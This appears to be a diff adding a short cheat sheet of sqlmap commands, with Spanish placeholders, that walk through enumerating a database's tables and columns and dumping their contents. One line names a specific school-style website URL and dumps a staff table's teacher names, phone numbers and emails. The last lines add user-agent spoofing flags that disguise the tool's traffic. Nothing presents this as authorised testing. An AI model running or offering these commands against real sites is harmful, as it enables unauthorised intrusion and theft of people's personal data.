@@ -1,0 +1,8 @@
+sqlmap -u (url) --dbs
+sqlmap -u (url) -D (base) --tables
+sqlmap -u (url) -D (base) -T (nombre tabla) --columns
+sqlmap -u (url) -D (base) -T (nombre tabla) -C (nombre de listas de tabla) --dump
+sqlmap -u http://www.cata.cl/noticia.php?id=745 -D test -T funcionarios -C profesor,telefono,nombre,email --dump
+
+--user-agent
+--random-agent
